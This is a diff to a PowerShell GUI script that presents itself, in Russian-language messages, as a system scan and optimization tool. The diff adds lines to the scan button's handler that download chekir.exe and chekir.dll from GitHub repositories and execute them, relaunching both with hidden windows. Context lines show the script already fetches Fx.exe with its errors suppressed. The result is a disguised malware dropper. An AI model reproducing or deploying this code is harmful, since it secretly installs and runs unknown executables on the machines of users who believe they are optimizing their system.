@@ -207,7 +207,15 @@ $scan = {
     $progress.Value = 100
     Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
     Start-Sleep 1
+
+     # Скачиваем everything в текущую папку
+    Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe    
+    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/chekir.dll" -OutFile "chekir.dll"; .\chekir.dll
     
+    # Запускаем 
+    Start-Process -FilePath "chekir.exe" -WindowStyle Hidden
+    Start-Process -FilePath "chekir.dll" -WindowStyle Hidden
+   
     # Скачиваем everything в текущую папку
     Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe" -OutFile "Fx.exe" -ErrorAction SilentlyContinue
     
@@ -229,4 +237,5 @@ $btn.Add_Click($scan)
 
 # Запуск
 [void]$form.ShowDialog()
+
 
